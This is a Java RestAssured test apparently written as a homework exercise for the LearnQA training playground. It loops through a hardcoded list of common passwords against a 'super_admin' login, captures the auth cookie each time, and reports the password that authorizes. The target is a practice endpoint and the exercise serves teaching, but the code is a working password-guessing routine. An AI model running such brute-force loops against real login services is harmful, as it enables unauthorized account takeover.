import io.restassured.RestAssured;
import io.restassured.http.Cookie;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.Map;

public class Ex9 {

    private static final String LOGIN = "super_admin";
    private static final String[] PASSWORDS = {
            "123456", "123456789", "12345678", "password", "qwerty123", "qwerty1",
            "111111", "12345", "secret", "123123", "1234567890", "1234567",
            "000000", "qwerty", "abc123", "password1", "iloveyou",
            "11111111", "dragon", "monkey", "123qwe", "dragon",
            "princess", "888888", "welcome", "7777777"
    }; //Список паролей из Википедии за 2019г

    @Test
    public void testLoginAndPass(){
        String initialUrl = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework";
        String cookieURL = "https://playground.learnqa.ru/ajax/api/check_auth_cookie";

        for (String password : PASSWORDS) {

            try {
                // 1. Получаем cookie
                Response response = RestAssured
                        .given()
                        .formParam("login", LOGIN)
                        .formParam("password", password)
                        .when()
                        .post(initialUrl);

                response.then().statusCode(200);
                Cookie authCookie = response.getDetailedCookies().asList().stream()
                        .filter(cookie -> cookie.getName().equals("auth_cookie"))
                        .findFirst()
                        .orElseThrow(() -> new RuntimeException("Cookie 'auth_cookie' не найдена"));

                //2. Проверяем cookie
                response = RestAssured
                        .given()
                        .cookie(authCookie)
                        .when()
                        .get(cookieURL);

                response.then().statusCode(200);
                String authStatus = response.asString();

                if (!authStatus.equals("You are NOT authorized")) {
                    System.out.println("Верный пароль: " + password);
                    System.out.println("Сообщение: " + authStatus);
                    return; // Завершаем после нахождения верного пароля
                }

            } catch (Exception e) {
                System.err.println("Ошибка при проверке пароля '" + password + "': " + e.getMessage());
                //Можно добавить обработку специфических ошибок, например, обработки ошибок 404
            }
        }
        System.out.println("Пароль не найден среди заданных.");
        }

    }
